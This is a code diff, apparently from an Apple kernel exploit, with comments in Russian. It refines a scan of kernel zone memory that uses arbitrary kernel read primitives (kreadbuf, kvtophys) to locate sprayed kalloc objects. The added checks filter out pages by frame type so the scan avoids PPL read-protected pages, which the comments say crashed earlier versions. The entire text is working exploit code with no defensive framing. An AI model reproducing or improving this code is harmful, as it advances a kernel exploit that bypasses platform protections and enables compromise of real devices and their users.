@@ -6331,6 +6331,12 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint64_t lo = (mnZ & ~0x3fffULL) - 0x2000000ULL, hi = (mxZ & ~0x3fffULL) + 0x2000000ULL;
                 for (uint64_t pg = lo; pg < hi && !zva; pg += 0x4000) {
                     if (!kpSafeToRead(pg)) continue;
+                    // 1.9.226: контент ТОЛЬКО типов {0x21,0x6,0xc} — табличные 0x9
+                    // могут быть PPL-read-защищены (смерть zone-скана 1.9.223 ×2);
+                    // спек/hit-хранилища — kalloc-объекты именно этих типов.
+                    uint64_t ppa226 = kvtophys(pg);
+                    int pft226 = ppa226 ? kpFrameTypeOf(ppa226) : -1;
+                    if (!(pft226 == 0x21 || pft226 == 0x6 || pft226 == 0xc)) continue;
                     uint8_t zbuf[0x4000];
                     kreadbuf(pg, zbuf, sizeof(zbuf));
                     for (uint32_t o = 0; o + 8 <= sizeof(zbuf) && !zva; o += 8) {
@@ -7443,6 +7449,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 for (uint64_t pg = lo; pg < hi && nSC < 8; pg += 0x4000) {
                     nPg++;
                     if (!kpSafeToRead(pg)) continue;
+                    // 1.9.226: контент ТОЛЬКО типов {0x21,0x6,0xc} (PPL-read-страницы в табличных типах)
+                    uint64_t ppa226 = kvtophys(pg);
+                    int pft226 = ppa226 ? kpFrameTypeOf(ppa226) : -1;
+                    if (!(pft226 == 0x21 || pft226 == 0x6 || pft226 == 0xc)) continue;
                     nMp++;
                     uint8_t sbuf[0x4000];
                     kreadbuf(pg, sbuf, sizeof(sbuf));
